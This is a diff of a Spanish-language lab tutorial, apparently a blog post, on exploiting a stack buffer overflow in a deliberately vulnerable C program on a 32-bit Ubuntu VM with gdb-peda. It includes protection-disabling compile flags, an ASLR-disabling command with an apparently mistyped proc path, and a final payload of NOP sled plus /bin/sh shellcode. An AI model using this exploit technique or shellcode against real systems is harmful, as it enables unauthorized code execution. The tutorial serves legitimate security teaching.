@@ -24,21 +24,14 @@ tags:
 - [Ejecución de comandos](#ejecución-de-comandos)
 
 ## Antecedentes:
-Antes de comenzar, debo decir que todo el procedimiento del laboratorio se llevará a cabo en una maquina virtual  especificamente en un sistema **ubuntu 14.04** de 32 bits , puedes programa de virtualizacion como VirtualBox o VMware.
+Antes de comenzar, debo decir que todo el procedimiento del laboratorio se llevará a cabo en una maquina virtual,  especificamente en un sistema **ubuntu 14.04** de 32 bits , puedes el programa de virtualizacion como VirtualBox o VMware.
 <p align="center">
 <img src="/assets/images/boflinux/1.png" width="75%">
 </p>
 
-Puedes comprobar con la siguiente sentencia para ver la informacion del sistema
-```bash
-> uname -a
-Linux ubuntu 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:28:33 UTC 2019 i686 i686 i686 GNU/Linux
-```
 ---
 **Instalacion de peda**  
-
-Para el proceso de debugging (depuración del programa) estaré utilizando **gdb** con un plugin adicional para darle una salida mas colorida y elegante.
-
+Para el proceso de debugging (depuración del programa) estaré utilizando **gdb** con un plugin adicional para darle una salida mas colorida y elegante.  
 Para añadir [peda](https://github.com/longld/peda) solo tienes que seguir las instrucciones que se especifican en el propio proyecto.
 
 <p align="center">
@@ -46,8 +39,7 @@ Para añadir [peda](https://github.com/longld/peda) solo tienes que seguir las i
 </p>
 
 
-## Creación de script vulnerable:
-El siguiente codigo es un simple script escrito en C , donde basicamente la parte vulnerable estaría concentrado en el método **strcmp**.
+## Creación de script vulnerable
 ```bash
 #include<stdio.h>
 #include<string.h>
@@ -71,6 +63,10 @@ gcc -z execstack -g -fno-stack-protector -mpreferred-stack-boundary=2 buffer.c -
 </p>
 
 
+#### Deshabilitar el ASLR
+```bash
+> echo 0 > /proc/syskernel/randomize_va_space
+```
 
 Para ver si el binario cuenta con protecciones, haremos uso del script [checksec](https://gist.github.com/ocean1/5571b9d1f8d739f92363) y otras caracteristicas del ejecutable.  
 Podemos ver que el DEP está deshabilitado
@@ -80,11 +76,7 @@ RELRO           STACK CANARY      NX            PIE             RPATH      RUNPA
 Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   buffer
 ```
 
-
-**ldd** es una utilidad de linea de comandos de linux que se utiliza para conocer las bibliotecas compartidas. 
-**ASLR desactivado**
-
-
+**ldd** es una utilidad de linea de comandos de linux que se utiliza para conocer las bibliotecas compartidas.  
 ```bash
 > ldd buffer
         linux-gate.so.1 =>  (0xb7769000)
@@ -100,22 +92,6 @@ Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RU
         /lib/ld-linux.so.2 (0xb7790000)
 ```
 
-#### Deshabilitar el ASLR
-
-## Creando script en C:
-```bash
-#include<stdio.h>
-#include<string.h>
-
-void vulnerable(char *buff){
-        char buffer[64];
-        strcpy(buffer,buff);
-}
- 
-void main(int argc, char **argv){
-        vulnerable(argv[1]);
-}
-```
 
 ## Ejecutando el programa.
 ```bash
@@ -236,9 +212,8 @@ gdb-peda$ x/100wx $esp-8
 0xbffff1ac:     0xbffffec2      0xbffffee2      0xbffffef7      0xbfffff01
 ```
 
-## Ejecución de comandos
 ---
-
+## Ejecución de comandos
 Finalmente ha sido posible ejecutarse comandos explotando un buffer overflow en un sistema linux.
 ```bash
 gdb-peda$ run $(python -c "print 'A'*68 + '\x74\xf0\xff\xbf' + '\x90'*200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
